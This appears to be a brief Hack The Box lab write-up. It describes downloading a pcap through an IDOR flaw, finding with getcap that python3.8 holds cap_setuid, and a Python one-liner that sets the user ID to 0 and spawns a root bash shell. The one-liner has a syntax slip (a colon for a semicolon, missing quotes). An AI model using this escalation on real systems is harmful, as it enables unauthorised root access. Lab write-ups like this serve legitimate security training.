#HTB 

Simple Idor to download a pcap 

then getcap -r / 2>/dev/null we see python 3.8 has cap_setuid

So we can get a shell as root
```
`/usr/bin/python3.8 -c import os; os.setuid(0): os.system("/bin/bash")`
```
